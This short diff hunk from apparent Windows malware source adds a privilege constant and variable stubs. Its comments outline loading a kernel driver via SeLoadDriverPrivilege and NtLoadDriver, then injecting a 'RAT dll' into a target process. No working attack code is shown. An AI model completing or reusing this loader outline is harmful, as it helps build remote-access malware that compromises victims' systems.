@@ -90,8 +90,13 @@ int main(int argc, char** argv)
 
     RegCloseKey(dservice);
 
+   
     // Enable SE_LOAD_DRIVER_PRIVILIGE via RtlAdjustPrivilige()
     // Call NtLoadDriver()
+
+    ULONG SE_LOAD_DRIVER_PRIVILIGE = 10UL;
+    bool SeLoadDriverWasEnabled;
+    NTSTATUS status; // = RtlAdjustPrivilige();
 
     // Inject the RAT dll to the target process's virtual memory (after performing relocations)
 
